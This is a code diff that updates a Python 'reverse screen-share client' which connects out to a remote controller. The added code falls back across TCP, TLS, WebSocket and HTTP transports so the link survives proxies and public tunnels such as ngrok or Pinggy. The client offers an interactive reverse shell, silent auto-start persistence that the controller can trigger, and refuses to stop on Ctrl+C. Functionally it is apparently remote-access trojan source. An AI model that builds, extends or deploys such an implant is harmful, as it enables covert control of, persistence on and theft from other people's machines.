+            try:
+                self._in.shutdown(socket.SHUT_RD)
+            except OSError:
+                pass
+
+    def close(self):
+        if self._closed:
+            return
+        self._closed = True
+        try:
+            self.up_q.put_nowait(None)
+        except queue.Full:
+            pass
+        try:
+            self.down_sock.close()
+        except OSError:
+            pass
+        if self._resources_closed:
+            return
+        self._resources_closed = True
+        for sock in (self._in, self._out):
+            try:
+                sock.shutdown(socket.SHUT_RDWR)
+            except OSError:
+                pass
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    def _write_local(self, data):
+        view = memoryview(data)
+        while view:
+            try:
+                sent = self._out.send(view)
+            except (socket.timeout, TimeoutError):
+                if self._closed:
+                    raise ConnectionError('half-duplex tunnel closed')
+                continue
+            if sent <= 0:
+                raise ConnectionError('half-duplex tunnel closed')
+            view = view[sent:]
+
+    def _down_loop(self):
+        try:
+            while not self._closed:
+                kind = self.reader.read_exact(1)
+                if kind == b'\x00':
+                    continue
+                if kind == b'\x02':
+                    break
+                if kind != b'\x01':
+                    raise OSError('bad half-duplex frame')
+                length = int.from_bytes(self.reader.read_exact(4), 'big')
+                if length > MAX_MSG:
+                    raise OSError('half-duplex frame is too large')
+                self._write_local(self.reader.read_exact(length))
+        except (OSError, ValueError, ConnectionError):
+            pass
+        finally:
+            try:
+                self._out.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
+            try:
+                self.down_sock.close()
+            except OSError:
+                pass
+
+    def _send_up(self, data):
+        sock = _connect_target(self.host, self.port)
+        try:
+            _tune_socket(sock)
+            if self.use_tls:
+                sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+                sock = _wrap_client_tls(sock, self.host)
+            version = 'HTTP/1.0' if (os.environ.get('CMON_FORCE_HTTP10') or '').strip() in ('1', 'true', 'yes') else 'HTTP/1.1'
+            lines = [
+                'POST /up {}'.format(version),
+                'Host: {}'.format(_host_header(self.host, self.port)),
+                'Content-Type: application/octet-stream',
+                'Content-Length: {}'.format(len(data)),
+                'Connection: close',
+                'X-CMon-Session: {}'.format(self.session_id),
+            ]
+            lines.extend(_tunnel_headers(self.host, self.token, self.role))
+            lines.extend(['', ''])
+            sock.settimeout(HALF_UP_TIMEOUT)
+            sock.sendall('\r\n'.join(lines).encode('latin-1') + data)
+            head, _extra = _read_http_head(sock)
+            parts = head.split('\r\n')
+            status = parts[0].split(None, 2) if parts else []
+            if len(status) < 2 or int(status[1]) != 200:
+                raise OSError('POST /up returned {}'.format(
+                    ' '.join(status[:2]) if status else 'no response'))
+        finally:
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    def _up_loop(self):
+        try:
+            while not self._closed:
+                try:
+                    first = self.up_q.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                if first is None:
+                    break
+                batch = bytearray(first)
+                # Batch small writes (keystrokes, JSON replies) for a short
+                # time, but never hold a large file transfer hostage.
+                while len(batch) < HALF_UP_BATCH:
+                    try:
+                        more = self.up_q.get_nowait()
+                    except queue.Empty:
+                        if len(batch) < 64 * 1024:
+                            time.sleep(0.005)
+                            try:
+                                more = self.up_q.get_nowait()
+                            except queue.Empty:
+                                break
+                        else:
+                            break
+                    if more is None:
+                        break
+                    batch += more
+                if batch:
+                    self._send_up(bytes(batch))
+        except (OSError, ValueError) as e:
+            if not self._closed:
+                print('[!] half-duplex upload stopped: {}'.format(e))
+                try:
+                    self.down_sock.shutdown(socket.SHUT_RDWR)
+                except OSError:
+                    pass
+        finally:
+            try:
+                self._out.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
+
+
+def _half_connect(host, port, use_tls=True, role='control', token=None):
+    """Start GET /down and return a portable half-duplex adapter."""
+    sid = token if role == 'shell' and token else secrets.token_urlsafe(24)
+    sock = _connect_target(host, port)
+    try:
+        _tune_socket(sock)
+        if use_tls:
+            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+            sock = _wrap_client_tls(sock, host)
+        version = 'HTTP/1.0' if (os.environ.get('CMON_FORCE_HTTP10') or '').strip() in ('1', 'true', 'yes') else 'HTTP/1.1'
+        lines = [
+            'GET /down?session={} {}'.format(quote(sid, safe=''), version),
+            'Host: {}'.format(_host_header(host, port)),
+            'Connection: keep-alive',
+            'X-CMon-Session: {}'.format(sid),
+        ]
+        lines.extend(_tunnel_headers(host, token, role))
+        lines.extend(['', ''])
+        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+        sock.sendall('\r\n'.join(lines).encode('latin-1'))
+        head, extra = _read_http_head(sock)
+        parts = head.split('\r\n')
+        status = parts[0].split(None, 2) if parts else []
+        if len(status) < 2 or int(status[1]) != 200:
+            raise TransportNotSupported('GET /down returned {}'.format(
+                ' '.join(status[:2]) if status else 'no response'))
+        headers = _http_headers(parts[1:])
+        sock.settimeout(None)
+        reader = _BodyStream(sock, headers, extra)
+        return HalfTunnelClient(sock, reader, sid, host, port, use_tls,
+                                role=role, token=token)
+    except Exception:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise
+
+
+def _client_tls_context(host='', allow_self_signed=False):
+    """TLS 1.2/1.3 client context with safe defaults.
+
+    Public tunnel hosts (ngrok, Pinggy, Cloudflare, ...) are verified with the
+    system trust store.  A private/LAN address accepts the controller's
+    self-signed certificate by default, matching the original one-line HTTPS
+    behavior.  CONTROLLER_TLS_VERIFY=1 forces verification (with an optional
+    CONTROLLER_TLS_CA bundle).  CONTROLLER_TLS_INSECURE=1 explicitly opts out
+    for a public hostname when the user really wants that.
+    """
+    verify_text = (os.environ.get('CONTROLLER_TLS_VERIFY') or '').strip().lower()
+    insecure_text = (os.environ.get('CONTROLLER_TLS_INSECURE') or '').strip().lower()
+    verify = verify_text in ('1', 'true', 'yes', 'on')
+    insecure = insecure_text in ('1', 'true', 'yes', 'on')
+    private = _host_is_private(host)
     try:
         if verify:
             cafile = os.environ.get('CONTROLLER_TLS_CA') or None
             context = ssl.create_default_context(cafile=cafile)
-        else:
+        elif insecure or private or allow_self_signed:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             context.check_hostname = False
             context.verify_mode = ssl.CERT_NONE
+        else:
+            context = ssl.create_default_context()
         try:
             context.minimum_version = ssl.TLSVersion.TLSv1_2
         except AttributeError:
@@ -3523,97 +4449,222 @@ def _client_tls_context():
         raise OSError('cannot create TLS client context: {}'.format(e))
 
 
-def _wrap_client_tls(sock, host):
-    context = _client_tls_context()
+def _host_is_private(host):
+    value = (host or '').strip().strip('[]').lower()
+    if value in ('localhost', '0.0.0.0', '::1') or value.endswith('.local') \
+            or value.endswith('.lan') or value.endswith('.internal'):
+        return True
     try:
-        return context.wrap_socket(sock, server_hostname=host)
+        address = ipaddress.ip_address(value)
+    except ValueError:
+        return False
+    return bool(address.is_private or address.is_loopback
+                or address.is_link_local or address.is_unspecified)
+
+
+def _wrap_client_tls(sock, host, allow_self_signed=False):
+    context = _client_tls_context(host, allow_self_signed=allow_self_signed)
+    try:
+        wrapped = context.wrap_socket(sock, server_hostname=host)
+        try:
+            selected = wrapped.selected_alpn_protocol()
+        except (AttributeError, NotImplementedError, OSError):
+            selected = None
+        if selected not in (None, 'http/1.1'):
+            try:
+                wrapped.close()
+            except OSError:
+                pass
+            raise TransportNotSupported(
+                'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
+        return wrapped
     except (OSError, ssl.SSLError) as e:
         try:
             sock.close()
         except OSError:
             pass
+        if isinstance(e, TransportNotSupported):
+            raise
         raise OSError('TLS handshake failed: {}'.format(e))
 
 
-def _http_connect(host, port, path='/tunnel'):
-    """Open one HTTP/HTTPS tunnel to a controller."""
-    sock = _connect_target(host, port)
+def _transport_candidates(host, port, scheme):
+    """Ordered transport families for an address.
+
+    The first successful family is cached; within HTTP/HTTPS the caller tries
+    WebSocket, then a streaming POST, then the half-duplex fallback.
+    """
+    scheme = (scheme or 'auto').lower()
+    if scheme == 'tcp':
+        return ['tcp']
+    if scheme == 'tls':
+        return ['tls']
+    if scheme == 'https':
+        return ['https']
+    if scheme == 'http':
+        return ['http']
+    preferred = CONNECTION_TYPE if CONNECTION_TYPE in ('tcp', 'http', 'https') else None
+    if _looks_like_tunnel_host(host) or port == 443:
+        order = ['https', 'http']
+    elif port == 80:
+        order = ['http', 'https']
+    else:
+        order = ['tcp', 'tls', 'http', 'https']
+    if preferred:
+        order = [preferred] + [item for item in order if item != preferred]
+    return order
+
+
+def _cache_key(host, port, scheme):
+    return (str(host).lower(), int(port), str(scheme).lower())
+
+
+def _remember_transport(key, kind):
+    with CMON_TRANSPORT_LOCK:
+        CMON_TRANSPORT_CACHE['key'] = key
+        CMON_TRANSPORT_CACHE['kind'] = kind
+
+
+def _cached_transport(key):
+    with CMON_TRANSPORT_LOCK:
+        if CMON_TRANSPORT_CACHE.get('key') == key:
+            return CMON_TRANSPORT_CACHE.get('kind')
+    return None
+
+
+def _recv_hello_ack(sock, timeout=TUNNEL_PROBE_TIMEOUT):
+    """Send the application hello and wait for the controller's end-to-end ack.
+
+    The ack is deliberately sent only after the controller has read our hello.
+    That makes it a true proof that a tunnel forwards both directions; a proxy
+    that buffers the request body cannot fake it.
+    """
     try:
-        _tune_socket(sock)
-        if CONNECTION_TYPE == 'https':
-            # create_connection() leaves a 3-second connect timeout on the
-            # socket.  The TLS handshake may legitimately take longer than
-            # that on a busy mobile link, so widen it before wrapping.
-            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
-            sock = _wrap_client_tls(sock, host)
-            try:
-                selected = sock.selected_alpn_protocol()
-            except (AttributeError, NotImplementedError, OSError):
-                selected = None
-            if selected not in (None, 'http/1.1'):
-                raise OSError('TLS negotiated {!r}; this tunnel needs HTTP/1.1'
-                              .format(selected))
-        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
-        host_header = str(host)
-        if ':' in host_header and not host_header.startswith('['):
-            host_header = '[{}]'.format(host_header)
-        request = (
-            'POST {} HTTP/1.1\r\n'
-            'Host: {}:{}\r\n'
-            'User-Agent: reverse-client/19\r\n'
-            'Content-Type: application/octet-stream\r\n'
-            'Transfer-Encoding: chunked\r\n'
-            'Connection: keep-alive\r\n'
-            'Cache-Control: no-store\r\n'
-            '\r\n'
-        ).format(path, host_header, port).encode('latin-1')
-        sock.sendall(request)
-        head, extra = _read_http_head(sock)
-        lines = head.split('\r\n')
-        if not lines:
-            raise OSError('empty HTTP response')
-        status = lines[0].split(None, 2)
-        if len(status) < 2:
-            raise OSError('malformed HTTP status line: {!r}'.format(lines[0]))
-        if status[0].upper() != 'HTTP/1.1':
-            raise OSError('controller/proxy answered {!r}; HTTP/1.1 is required'
-                          .format(status[0]))
+        sock.settimeout(timeout)
+    except (AttributeError, OSError):
+        pass
+    try:
+        send_msg(sock, {'type': 'hello', 'env': environment_report()})
+        msg = recv_msg(sock)
+        if not isinstance(msg, dict) or msg.get('type') != 'hello_ack':
+            raise TransportNotSupported(
+                'controller did not acknowledge the tunnel handshake')
+        return msg
+    except (socket.timeout, TimeoutError):
+        raise TransportNotSupported('tunnel handshake timed out')
+    finally:
         try:
-            code = int(status[1])
-        except ValueError:
-            raise OSError('malformed HTTP status code: {!r}'.format(status[1]))
-        if code != 200:
-            raise OSError('controller returned HTTP {} {}'.format(
-                code, status[2] if len(status) > 2 else ''))
-        headers = _http_headers(lines[1:])
-        transfer_tokens = [item.strip() for item in
-                           headers.get('transfer-encoding', '').lower().split(',')
-                           if item.strip()]
-        if (not transfer_tokens or transfer_tokens[-1] != 'chunked'
-                or any(item not in ('identity', 'chunked')
-                       for item in transfer_tokens[:-1])):
-            raise OSError('controller response is not chunked')
-        encoding = headers.get('content-encoding', '').strip().lower()
-        if encoding not in ('', 'identity'):
-            raise OSError('controller/proxy compressed the tunnel '
-                          '({}); disable HTTP compression for this port'
-                          .format(encoding))
-        sock.settimeout(None)
-        return HttpTunnel(sock, extra, name='http-' + path.strip('/'))
-    except Exception:
-        try:
-            sock.close()
-        except OSError:
+            sock.settimeout(None)
+        except (AttributeError, OSError):
             pass
-        raise
 
 
-def _open_controller_connection(host, port):
-    if CONNECTION_TYPE == 'tcp':
-        return _connect_target(host, port)
-    if CONNECTION_TYPE in ('http', 'https'):
-        return _http_connect(host, port, '/tunnel')
-    raise OSError('unknown connection_type {!r}'.format(connection_type))
+def _open_controller_connection(host, port, scheme='auto', role='control',
+                                token=None):
+    """Open an automatic transport and complete the application handshake.
+
+    role='control' sends hello/wait-ack so a buffering proxy is detected before
+    the main loop trusts the link.  role='shell' authenticates with the token
+    issued on the control link; it has its own terminal-size handshake later.
+    """
+    key = _cache_key(host, port, scheme)
+    candidates = _transport_candidates(host, port, scheme)
+    cached = _cached_transport(key)
+    if cached and cached in candidates:
+        candidates = [cached] + [item for item in candidates if item != cached]
+    errors = []
+    for family in candidates:
+        # Within one HTTP(S) family, try WebSocket first (best through
+        # tunnels), then the streaming POST, then the half-duplex fallback.
+        if family in ('http', 'https'):
+            use_tls = family == 'https'
+            variants = []
+            if (os.environ.get('CMON_DISABLE_WS') or '').strip() not in ('1', 'true', 'yes'):
+                variants.append(
+                    ('websocket', lambda: _ws_connect(
+                        host, port, '/shell' if role == 'shell' else '/tunnel',
+                        use_tls=use_tls, token=token)))
+            if (os.environ.get('CMON_DISABLE_STREAM') or '').strip() not in ('1', 'true', 'yes'):
+                variants.append(
+                    ('http-stream', lambda: _http_connect(
+                        host, port, '/shell' if role == 'shell' else '/tunnel',
+                        use_tls=use_tls, token=token)))
+            if (os.environ.get('CMON_DISABLE_HALF') or '').strip() not in ('1', 'true', 'yes'):
+                variants.append(
+                    ('http-half', lambda: _half_connect(
+                        host, port, use_tls=use_tls, role=role, token=token)))
+            cached_variant = _cached_transport(key)
+            if cached_variant:
+                variants.sort(key=lambda item: item[0] != cached_variant)
+        elif family == 'tls':
+            def raw_tls():
+                sock = _connect_target(host, port)
+                try:
+                    _tune_socket(sock)
+                    sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+                    sock = _wrap_client_tls(sock, host, allow_self_signed=True)
+                    return _raw_handshake(sock, role, token)
+                except Exception:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+                    raise
+            variants = [('tls', raw_tls)]
+        else:
+            def raw_tcp():
+                sock = _connect_target(host, port)
+                try:
+                    _tune_socket(sock)
+                    return _raw_handshake(sock, role, token)
+                except Exception:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+                    raise
+            variants = [('tcp', raw_tcp)]
+        for variant, factory in variants:
+            sock = None
+            try:
+                sock = factory()
+                if role == 'control':
+                    _recv_hello_ack(sock)
+                _remember_transport(key, variant)
+                return sock, family, variant
+            except Exception as e:
+                errors.append('{}: {}'.format(variant, e))
+                if sock is not None:
+                    try:
+                        sock.close()
+                    except OSError:
+                        pass
+                continue
+    raise TransportNotSupported('; '.join(errors) or 'no transport succeeded')
+
+
+def _raw_handshake(sock, role, token=None):
+    """CMON2 marker for raw TCP/TLS, with the shell token when needed."""
+    if role == 'shell':
+        if not token:
+            raise TransportNotSupported('shell token is missing')
+        line = 'CMON2 SHELL {}\n'.format(token).encode('ascii', 'ignore')
+    else:
+        line = CMON_MAGIC
+    sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+    sock.sendall(line)
+    data = b''
+    while b'\n' not in data:
+        chunk = sock.recv(1)
+        if not chunk:
+            raise TransportNotSupported('controller closed during CMON2 handshake')
+        data += chunk
+        if len(data) > 512:
+            raise TransportNotSupported('CMON2 acknowledgement is too long')
+    if not data.startswith(CMON_ACK.strip()):
+        raise TransportNotSupported('unexpected CMON2 acknowledgement: {!r}'.format(data))
+    sock.settimeout(None)
+    return sock
 
 
 def main():
@@ -3621,27 +4672,38 @@ def main():
     _immune_to_ctrl_c()          # Ctrl+C is never a way to stop this client
     _windows_dpi_aware()         # correct screenshot pixels on scaled displays
     if CONNECTION_TYPE not in VALID_CONNECTION_TYPES:
-        print("[!] Unknown connection_type {!r}. Use one of: tcp, http, https."
+        print("[!] Unknown connection_type {!r}. Use auto, tcp, http or https."
               .format(CONNECTION_TYPE))
         return
     if any(a in ('-h', '--help') for a in sys.argv[1:]):
-        print('usage: python client.py [controller_ip] [controller_port]')
+        print('usage: python client.py [address] [optional_port] [options]')
+        print('       address: IP, host:port, tcp://host:port, tls://host:port,')
+        print('                http://..., https://..., or a Pinggy/ngrok URL')
         print('       --persist          install auto-start (silent) for this client')
         print('       --visible          with --persist: show a window instead')
         print('       --log-file PATH    with --persist: keep a log file')
         print('       --remove-persist   remove the auto-start entry')
-        print('       connection_type is set in the source: tcp, http or https')
-        print('       (edit the same line in controller.py and client.py)')
+        print('       connection_type is only a preference; auto is recommended.')
+        print('       The controller accepts every transport on one port.')
         return
 
-    target_ip, target_port, do_persist, do_remove, visible, log_file = parse_args(sys.argv[1:])
+    (target_ip, target_port, target_scheme, do_persist, do_remove,
+     visible, log_file) = parse_args(sys.argv[1:])
+    display_address = _host_header(target_ip, target_port)
+    if target_scheme in ('tcp', 'tls', 'http', 'https'):
+        display_address = '{}://{}'.format(target_scheme, display_address)
 
-    print("[+] Reverse {} screen-share client v19".format(
-        CONNECTION_TYPE.upper()))
-    if CONNECTION_TYPE == 'https':
-        print("[i] HTTPS: TLS 1.2/1.3, HTTP/1.1 tunnel. The controller's")
-        print("    self-signed certificate is accepted by default; set")
-        print("    CONTROLLER_TLS_VERIFY=1 and CONTROLLER_TLS_CA for verification.")
+    print("[+] Reverse auto-transport screen-share client v20")
+    print("[i] Controller: {}  (preference: {})".format(
+        display_address, CONNECTION_TYPE.upper()))
+    if target_scheme in ('https', 'auto') and not _host_is_private(target_ip):
+        print("[i] Public HTTPS certificate verification is ON (system trust store).")
+        print("    If a direct public endpoint uses a self-signed certificate,")
+        print("    set CONTROLLER_TLS_INSECURE=1 in the client environment.")
+    elif target_scheme == 'https':
+        print("[i] Private HTTPS: the controller's self-signed certificate is")
+        print("    accepted by default. Set CONTROLLER_TLS_VERIFY=1 and")
+        print("    CONTROLLER_TLS_CA for strict verification.")
 
     if _loopback_target(target_ip) and not do_remove:
         print("[i] {} is this machine's own loopback address - that only works".format(target_ip))
@@ -3654,7 +4716,7 @@ def main():
         return
 
     if do_persist:
-        print(install_autostart(target_ip, target_port, silent=not visible, log_file=log_file))
+        print(install_autostart(display_address, target_port, silent=not visible, log_file=log_file))
         return
 
     if is_ios():
@@ -3695,35 +4757,37 @@ def main():
         # matter. This loop never gives up: only 'exit' from the controller or
         # closing this program stops the client.
         failures = 0
+        client_socket = None
+        transport_label = '?'
         while True:
             try:
-                # create_connection covers DNS and every address family, and the
-                # timeout bounds a dead/silent host: a plain connect() could sit
-                # in the kernel for ~127 s, which looked like a frozen client.
-                client_socket = _open_controller_connection(target_ip, target_port)
+                # The auto connector resolves DNS with a bounded wait, tries
+                # TCP/TLS/HTTP/HTTPS (WebSocket first), and completes the
+                # hello/ack before returning.  A buffering tunnel therefore
+                # fails here and the next transport is tried instead of
+                # producing a half-connected client.
+                client_socket, _family, transport_label = _open_controller_connection(
+                    target_ip, target_port, target_scheme)
                 client_socket.settimeout(None)
                 break
             except Exception as e:
                 failures += 1
                 if failures == 1 or failures % 10 == 0:
-                    print("[!] Controller not reachable at {}:{} - {}; retrying every {}s...".format(
-                        target_ip, target_port, _connect_error_hint(e), RETRY_DELAY))
+                    print("[!] Controller not reachable at {} - {}; retrying every {}s...".format(
+                        display_address, _connect_error_hint(e), RETRY_DELAY))
+                client_socket = None
                 time.sleep(RETRY_DELAY)
 
-        print("[+] Reverse {} shell connected to {}:{}".format(
-            CONNECTION_TYPE.upper(), target_ip, target_port))
+        print("[+] Connected to {} using {} (automatic transport)".format(
+            display_address, transport_label))
         try:
             _tune_socket(client_socket)  # fast reconnect when this controller dies
         except OSError:
             pass
 
-        # Tell the controller what this machine has (OS, session, capture tools)
-        # so it can explain any missing dependency with exact install commands.
-        try:
-            send_msg(client_socket, {'type': 'hello', 'env': environment_report()})
-        except OSError:
-            pass
-        # Serve commands until the controller goes away (then reconnect and wait)
+        # The hello was already sent and acknowledged inside the connector, so
+        # a proxy that buffers request bodies can never be mistaken for a live
+        # full-duplex link.  Serve commands until the controller goes away.
         stop = False
         del DEFERRED[:]                      # nothing left over from a dead session
         with CANCELED_LOCK:
@@ -3883,7 +4947,7 @@ def main():
 
                 if mtype == 'persist':
                     try:
-                        report = install_autostart(target_ip, target_port)
+                        report = install_autostart(display_address, target_port)
                     except Exception as e:
                         report = 'persist failed: {}'.format(e)
                     send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
@@ -3934,13 +4998,14 @@ def main():
                     continue
 
                 if mtype == 'shell':
-                    try:
-                        shell_port = int(msg.get('port'))
-                    except (TypeError, ValueError):
+                    token = msg.get('token')
+                    if not token:
                         send_msg(client_socket, {'type': 'error', 'id': req_id,
-                                                 'data': 'shell: controller sent no valid port'})
+                                                 'data': 'shell: controller sent no token; '
+                                                         'update both scripts together'})
                         continue
-                    start_interactive_shell(client_socket, target_ip, shell_port, req_id)
+                    start_interactive_shell(client_socket, target_ip, target_port,
+                                            target_scheme, token, req_id)
                     continue
 
                 send_msg(client_socket, {'type': 'error', 'id': req_id,
